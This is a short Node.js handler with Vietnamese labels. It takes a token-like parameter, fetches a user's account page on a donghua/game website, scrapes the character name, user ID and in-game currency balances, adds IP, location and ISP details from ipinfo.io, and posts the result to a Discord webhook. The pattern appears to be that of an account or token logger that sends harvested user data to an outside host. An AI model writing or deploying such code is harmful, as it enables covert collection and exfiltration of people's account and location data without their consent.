import fetch from 'node-fetch';
import cheerio from 'cheerio';

const logUserHandler = async (req, res) => {
  try {
    const { t } = req.body;
    if (!t) return res.status(400).json({ error: 'Missing t param' });

    const url = `https://hoathinh3d.site/?t=${t}`;
    const html = await fetch(url, { credentials: 'include' }).then(res => res.text());
    const $ = cheerio.load(html);

    const userId = html.match(/"user_id"\s*:\s*"(\d+)"/)?.[1] || 'Không rõ';
    const name = $('#ch_head_name').text().trim() || 'Không rõ';
    const tuVi = $('#head_manage_acc div').filter((i, el) => $(el).text().includes('Tu Vi')).text().match(/Tu Vi:\s*(\d+)/)?.[1] || '0';
    const tinhThach = $('#head_manage_acc div').filter((i, el) => $(el).text().includes('Tinh Thạch')).text().match(/Tinh Thạch:\s*(\d+)/)?.[1] || '0';
    const tienNgoc = $('#head_manage_acc div').filter((i, el) => $(el).text().includes('Tiên Ngọc')).text().match(/Tiên Ngọc:\s*(\d+)/)?.[1] || '0';

    const ipinfoToken = process.env.IPINFO_TOKEN;
    const ipinfo = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`).then(res => res.json());

    const message = [
      `🧙 **THÔNG TIN NGƯỜI CHƠI**`,
      `👤 Nhân vật: ${name}`,
      `🆔 ID: ${userId}`,
      `⚡ Tu Vi: ${tuVi}`,
      `💎 Tinh Thạch: ${tinhThach}`,
      `🔮 Tiên Ngọc: ${tienNgoc}`,
      `🌐 Trang: ${url}`,
      `🌍 IP: ${ipinfo.ip || 'Không rõ'}`,
      `📍 Vị trí: ${ipinfo.city || ''}, ${ipinfo.region || ''}, ${ipinfo.country || ''}`,
      `📡 ISP: ${ipinfo.org || 'Không rõ'}`,
      `🕒 Thời gian: ${new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" })}`,
      `💩💩💩💩💩💩💩💩💩💩`
    ].join('\n');

    const webhook = process.env.DISCORD_WEBHOOK;
    await fetch(webhook, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: message })
    });

    return res.json({ success: true, message: 'Gửi thành công về Discord' });
  } catch (err) {
    console.error('Lỗi:', err);
    return res.status(500).json({ success: false, error: err.toString() });
  }
};

export default logUserHandler;
